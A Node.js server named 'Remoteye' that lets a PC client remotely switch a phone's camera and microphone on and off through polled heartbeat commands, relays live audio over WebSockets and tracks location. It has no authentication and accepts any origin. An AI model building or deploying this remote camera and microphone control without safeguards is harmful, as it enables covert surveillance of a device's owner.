const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { WebSocketServer } = require('ws');

const app = express();
app.use(express.json());
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' }
});

const wss = new WebSocketServer({ server, path: '/audio' });
let audioClients = [];

wss.on('connection', (ws) => {
  audioClients.push(ws);
  ws.on('message', (data) => {
    audioClients.forEach(client => {
      if (client !== ws && client.readyState === 1) client.send(data);
    });
  });
  ws.on('close', () => {
    audioClients = audioClients.filter(c => c !== ws);
  });
});

let estadoDispositivo = {
  conectado: false,
  camaraActiva: false,
  microfonoActivo: false,
  ubicacion: 'Desconocida',
  ultimoLatido: null,
  comandoPendiente: null,
};

// Ruta HTTP para el telefono
app.post('/latido', (req, res) => {
  estadoDispositivo.conectado = true;
  estadoDispositivo.ultimoLatido = new Date().toISOString();

  const comando = estadoDispositivo.comandoPendiente;
  estadoDispositivo.comandoPendiente = null;

  io.to('pc').emit('latido', { timestamp: estadoDispositivo.ultimoLatido });
  io.to('pc').emit('telefono_conectado', estadoDispositivo);

  res.json({ comando });
});

io.on('connection', (socket) => {
  socket.on('identificar', (data) => {
    if (data.tipo === 'pc') {
      socket.join('pc');
      socket.emit('estado_actual', estadoDispositivo);
    }
  });

  socket.on('activar_camara', () => {
    estadoDispositivo.camaraActiva = true;
    estadoDispositivo.comandoPendiente = 'activar_camara';
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('detener_camara', () => {
    estadoDispositivo.camaraActiva = false;
    estadoDispositivo.comandoPendiente = 'detener_camara';
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('activar_microfono', () => {
    estadoDispositivo.microfonoActivo = true;
    estadoDispositivo.comandoPendiente = 'activar_microfono';
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('detener_microfono', () => {
    estadoDispositivo.microfonoActivo = false;
    estadoDispositivo.comandoPendiente = 'detener_microfono';
    io.to('pc').emit('estado_actual', estadoDispositivo);
  });

  socket.on('disconnect', () => {});
});

app.get('/', (req, res) => {
  res.json({ status: 'Remoteye server corriendo', dispositivo: estadoDispositivo });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});